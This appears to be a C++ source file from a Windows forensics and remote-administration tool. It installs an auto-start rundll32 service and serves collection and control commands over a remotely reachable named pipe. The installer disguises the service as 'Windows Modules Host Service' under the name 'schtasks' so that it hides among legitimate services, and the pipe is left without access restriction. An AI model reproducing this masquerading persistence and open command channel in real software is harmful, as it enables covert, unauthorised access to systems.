/**
 * @file        src/secfuncs/Service.cc
 * @license     zlib (view the LICENSE file for details)
 * @copyright   Trezanik Developers, 2014-2025
 */


#include "Service.h"
#include "Utility.h"
#include "Message.h"
#include "DllWrapper.h"

#include <iomanip>
#include <sstream>
#include <string>

#include <process.h>
#include <WS2tcpip.h>

#pragma comment ( lib, "WS2_32.lib" )


void WINAPI
ServiceCtrlHandler(
	DWORD dwCtrl
)
{
	// don't interfere with controls sent to us
	switch ( dwCtrl )
	{
	case SERVICE_CONTROL_STOP:
	{
		ServiceReportStatus(SERVICE_STOP_PENDING, 5000);
		
		HANDLE  evth = ::OpenEvent(EVENT_MODIFY_STATE, FALSE, ServiceEventName());
		if ( evth == NULL )
		{
			ServiceReportStatus(SERVICE_STOPPED, 0);

			// no way to stop service cleanly, make sure we terminate
			::ExitProcess(0);
			return;
		}

		::SetEvent(evth);
		::CloseHandle(evth);
		return;
	}
	case SERVICE_CONTROL_INTERROGATE:
		break;
	default:
		break;
	}
}


wchar_t*
ServiceEventName()
{
	static wchar_t* retval = nullptr;
	static wchar_t  name[64] = L"Local\\";
	static wchar_t  default_name[] = L"Local\\{CA700416-6E14-4ED5-8584-70601439F868}";

	if ( retval != nullptr )
	{
		return retval;
	}

	retval = default_name;

	wchar_t  windir[MAX_PATH];
	
	if ( ::GetWindowsDirectory(windir, _countof(windir)) == 0 )
	{
		return retval;
	}

	windir[3] = '\0';

	DWORD  vol_serial = 0;
	
	if ( ::GetVolumeInformation(windir, nullptr, 0, &vol_serial, nullptr, nullptr, nullptr, 0) == 0 )
	{
		return retval;
	}

	wcscat_s(name, _countof(name), std::to_wstring(vol_serial).c_str());

	std::vector<std::wstring>  keys_vect;
	GetAllRegistrySubkeys(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor", keys_vect);
	
	wcscat_s(name, _countof(name), std::to_wstring(keys_vect.size()).c_str());

	retval = name;

	return retval;
}


int
ServiceInstall()
{
	int  retval = -1;
	SC_HANDLE  scmh = ::OpenSCManager(L".", nullptr, SC_MANAGER_ALL_ACCESS);

	if ( scmh == nullptr )
	{
		return retval;
	}

	// read from registry value for custom values, use default if blank
	// defaults are good enough to hide amongst legit stuff, but name/display clearly suspect

	wchar_t  svc_displayname[] = L"Windows Modules Host Service";
	wchar_t  svc_description[] = L"This service manages the Windows Modules Installer. If this service is disabled, install or uninstall of Windows updates might fail for this computer.";
	ULONG    svc_type  = SERVICE_WIN32_OWN_PROCESS; //SERVICE_KERNEL_DRIVER
	ULONG    svc_start = SERVICE_AUTO_START;// SERVICE_DEMAND_START
	ULONG    svc_error = SERVICE_ERROR_IGNORE;
	
	SC_HANDLE  svch = ::OpenService(scmh, ServiceName(), SERVICE_QUERY_CONFIG);

	// get dll name from live environment
	if ( svch == nullptr )
	{
		svch = ::CreateService(scmh, ServiceName(), svc_displayname, SERVICE_ALL_ACCESS,
			svc_type, svc_start, svc_error, L"rundll32.exe secfuncs.dll,ServiceRun",
			nullptr, nullptr, nullptr, nullptr, nullptr
		);

		if ( svch )
		{
			SERVICE_DESCRIPTION     sd;
			sd.lpDescription = svc_description;
			::ChangeServiceConfig2(svch, SERVICE_CONFIG_DESCRIPTION, &sd);
			
			::CloseServiceHandle(svch);
			retval = 0;
		}
	}
	else
	{
		// exists
		retval = 1;
	}

	::CloseServiceHandle(scmh);
	return retval;
}


wchar_t*
ServiceName()
{
	static wchar_t* retval = nullptr;
	static wchar_t  name[64] = L"";
	static wchar_t  default_name[] = L"schtasks"; // real one is Schedule

	if ( retval != nullptr )
	{
		return retval;
	}

	retval = default_name;


	// option: find an existing service, copy its name, tweak

	std::wstring  val;

	// read registry value for our application, if found then use
	GetRegistryValueDataString(HKEY_LOCAL_MACHINE, L"SOFTWARE\\ODBC\\ODBCINST.INI\\SQL Server\\Service", val);

#if 0
	std::map<std::string, std::string>  map;

	auto res = map.find("Service");

	if ( res != map.end() )
	{
		wcscpy_s(name, _countof(name), res->second.c_str());
		retval = name;
	}
#else
	if ( !val.empty() )
	{
		wcscpy_s(name, _countof(name), val.c_str());
		retval = name;
	}
#endif
	
	return retval;
}


wchar_t*
ServicePipeName()
{
	static wchar_t* retval = nullptr;
	static wchar_t  name[64] = L"\\\\.\\pipe\\";
	static wchar_t  default_name[] = L"\\\\.\\pipe\\{E6A68E31-BAD7-4460-9311-BD8176800852}";

	if ( retval != nullptr )
	{
		return retval;
	}

	// 'client' code must use the same method to determine the connecting name

	std::wstring  val;

	GetRegistryValueDataString(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName\\ComputerName", val);

	if ( !val.empty() )
	{
		uint32_t  oldcrc32 = 0xFFFFFFFF;

		for ( auto& c : val )
		{
			oldcrc32 = UPDC32(c, oldcrc32);
		}

		wcscat_s(name, _countof(name), std::to_wstring(~oldcrc32).c_str());

		retval = name;
	}
	else
	{
		retval = default_name;
	}

	return retval;
}


void
ServiceReportStatus(
	DWORD dwCurrentState,
	DWORD dwWaitHint,
	DWORD dwWin32ExitCode
)
{
	static DWORD    dwCheckPoint = 1;
	static SERVICE_STATUS_HANDLE  ssh = NULL;
	SERVICE_STATUS  ss;

	if ( ssh == NULL )
	{
		// requires Win XP
		ssh = ::RegisterServiceCtrlHandler(ServiceName(), ServiceCtrlHandler);
	}

	// yes, these are intentionally illegitimate
	ss.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	ss.dwServiceSpecificExitCode = 0;
	ss.dwCurrentState = dwCurrentState;
	ss.dwWin32ExitCode = dwWin32ExitCode;
	ss.dwWaitHint = dwWaitHint;

	if ( dwCurrentState == SERVICE_START_PENDING )
		ss.dwControlsAccepted = 0;
	else
		ss.dwControlsAccepted = SERVICE_ACCEPT_STOP;

	if ( (dwCurrentState == SERVICE_RUNNING) || (dwCurrentState == SERVICE_STOPPED) )
		ss.dwCheckPoint = 0;
	else
		ss.dwCheckPoint = dwCheckPoint++;

	// Report the status of the service to the SCM.
	::SetServiceStatus(ssh, &ss);
}


int
ServiceRun()
{
#if 0
	/*
	 * Expectation:
	 * The secfuncs.dll has been deployed to a system.
	 * Service has been installed to use rundll32 as the invoker
	 * Service is automatically starting on boot
	 * We are in a stance of listening for a remote connection from isochrone
	 * within a workspace, to enable command invocation more 'easily' than doing
	 * plain remote commands
	 * 
	 * - Minimal activity
	 * - Open a socket
	 * - Restrict inbound connections to known appropriate IPs
	 */

	// Report initial status to the SCM
	ServiceReportStatus(SERVICE_START_PENDING, 5000, NO_ERROR);

	WSAData  wsa;

	// 2.2 available from NT5
	if ( ::WSAStartup(MAKEWORD(2,2), &wsa) != 0 )
	{
		ServiceReportStatus(SERVICE_STOPPED, 0);
		return 0;
	}

	BOOL  manual_reset = TRUE;
	BOOL  initial = FALSE;
	// to avoid hardcode, could use e.g. volume serial, num cpus, something not existing
	
	HANDLE  evth = ::CreateEvent(nullptr, manual_reset, initial, ServiceEventName());

	if ( evth == NULL )
	{
		::WSACleanup();
		ServiceReportStatus(SERVICE_STOPPED, 0);
		return 0;
	}

	unsigned int   tid;
	HANDLE  thread = (HANDLE)_beginthreadex(NULL, 0, &ServiceThread, nullptr, 0, &tid);
	if ( thread == NULL )
	{
		::WSACleanup();
		ServiceReportStatus(SERVICE_STOPPED, 0);
		return 0;
	}

	ServiceReportStatus(SERVICE_RUNNING, 0);
	
	DWORD  res = ::WaitForSingleObject(thread, INFINITE);

	if ( res == WAIT_OBJECT_0 )
	{
		ServiceReportStatus(SERVICE_STOP_PENDING, 5000);

		// Wait/Terminate outstanding commands
		// CloseSocket()

		ServiceReportStatus(SERVICE_STOPPED, 0);
	}
	else
	{
		ServiceReportStatus(SERVICE_STOPPED, 0);
	}

	WSACleanup();
#else
	
	HANDLE  server_pipe = ::CreateNamedPipe(ServicePipeName(), PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_ACCEPT_REMOTE_CLIENTS, 1,
		message_size_max, message_size_max, pipe_timeout, nullptr /// @todo - restrict account access
	);

	if ( server_pipe == INVALID_HANDLE_VALUE )
	{
		return 0;
	}

	MessageHandler   msghdlr;

	while ( 1 ) // service run
	{
		/*
		 * We can operate in 'dumb' mode here; only one client connection is
		 * ever expected, and the flow is identical:
		 * 1) Client connects to pipe
		 * 2) Client sends message with command (<= 4096 bytes)
		 * 3) Server processes request
		 * 4) Server sends message with response
		 * 5) Server continues sending responses until no data remains
		 * 6) Server disconnects client, and returns to listen state
		 */

		// wait for client connection
		if ( !::ConnectNamedPipe(server_pipe, nullptr) )
		{
			break;
		}
		
		unsigned char  buf[4096];
		DWORD  cnt_read;

		if ( !::ReadFile(server_pipe, buf, message_size_max, &cnt_read, nullptr) )
		{
		}
		// all commands with header and footer result in minimal read of 20
		if ( cnt_read < 20 || cnt_read > sizeof(buf) )
		{
		}

		std::shared_ptr<CommandMessage> cmd_msg = nullptr;

		if ( msghdlr.ReceiveCommand(buf, cnt_read, cmd_msg) != 0 )
		{
			goto reset;
		}


		

		switch ( cmd_msg->Command() )
		{
		case cmd_GetAutostarts:
			//GetAutostarts(as);
			break;
		case cmd_GetEvidenceOfExecution:
		case cmd_GetPowerShellInvokedCommandsForAll:
		case cmd_GetPowerShellInvokedCommandsForUser:
		case cmd_Kill:
		case cmd_Logoff:
		case cmd_ReadAmCache:
		case cmd_ReadAppCompatFlags:
		case cmd_ReadBAM:
		case cmd_ReadChromiumDataForAll:
		case cmd_ReadChromiumDataForUser:
		case cmd_ReadPrefetch:
		case cmd_ReadUserAssist:
		case cmd_Restart:
		case cmd_Shutdown:
		case cmd_Tasklist:
			// get process list
			// generate and send response
			break;
		default:
			::DebugBreak();
			goto reset;
		}

reset:
		::FlushFileBuffers(server_pipe);
		// completed - disconnect client
		::DisconnectNamedPipe(server_pipe);
	}

#endif

	// rundll terminates
	return 0;
}


unsigned
ServiceThread(
	void* params
)
{
	SOCKET  listener = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in  svc;

	if ( listener == INVALID_SOCKET )
	{
		return UINT_MAX;
	}

	//inet_pton();
	//svc.sin_addr.S_un.S_addr =  inet_addr("0.0.0.0");
	svc.sin_family = AF_INET;
	svc.sin_port = htons(666); // DOOM

	int  res = ::bind(listener, (SOCKADDR*)&svc, sizeof(svc));

	if ( res == SOCKET_ERROR )
	{
		::closesocket(listener);
		return UINT_MAX;
	}

	// no legit reason to have more than 2 connections
	if ( ::listen(listener, 2) == SOCKET_ERROR )
	{
		::closesocket(listener);
		return UINT_MAX;
	}

#if 1
	unsigned long  nonblocking = 1;
	if ( (res = ioctlsocket(listener, FIONBIO, &nonblocking)) != 0 )
	{
		// change to non-blocking failed
		// return?
	}
#endif

	HANDLE  evth = ::OpenEvent(STANDARD_RIGHTS_READ, FALSE, ServiceEventName());
	SOCKET  client = INVALID_SOCKET;
	sockaddr_in  client_sa;
	int     csa_size = sizeof(client_sa);

	if ( evth == NULL )
	{
		return UINT_MAX;
	}

	/*
	 * With this loop structure, we'll pause for x timeout after every connect,
	 * send, recv; any operation.
	 * We also enforce a single accepted connection by not presenting the ability
	 * to accept until the existing socket is closed.
	 * This works for our use case, but is definitely not recommended for any
	 * 'proper' client-server communication!
	 * 
	 * The loop will only be broken if the synchronization event handle is either
	 * set, or otherwise fails.
	 */
	while ( 1 )
	{
		DWORD  waitres = ::WaitForSingleObject(evth, 1000);
		
		if ( waitres != WAIT_TIMEOUT )
		{
			break;
		}
#if 0
		timeval  to;
		to.tv_sec = 5;

		select(0,0,0,0,&to);
#endif

		if ( client != INVALID_SOCKET )
		{
			// send and recv flow


			// if quit or broken, ::closesocket(client); client = INVALID_SOCKET;
		}
		else
		{
			client = ::accept(listener, (SOCKADDR*)&client_sa, &csa_size);
			if ( client == INVALID_SOCKET )
			{
				int  err = ::WSAGetLastError();
				if ( err == WSAEWOULDBLOCK )
				{
					continue;
				}
			}
			else
			{
				// hello
			}
		}

		::closesocket(client);
	}

	::closesocket(listener);
	return 0;
}


int
ServiceUninstall()
{
	int  retval = -1;
	SC_HANDLE  scmh = ::OpenSCManager(L".", nullptr, SC_MANAGER_ALL_ACCESS);

	if ( scmh == nullptr )
	{
		return retval;
	}

	SC_HANDLE  svch = ::OpenService(scmh, ServiceName(), SERVICE_ALL_ACCESS);

	if ( svch != nullptr )
	{
		if ( !::DeleteService(svch) )
		{
			retval = -1;
		}
		else
		{
			retval = 0;
		}
	}
	else
	{
		// doesn't exist
		retval = 0;
	}

	::CloseServiceHandle(scmh);
	return retval;
}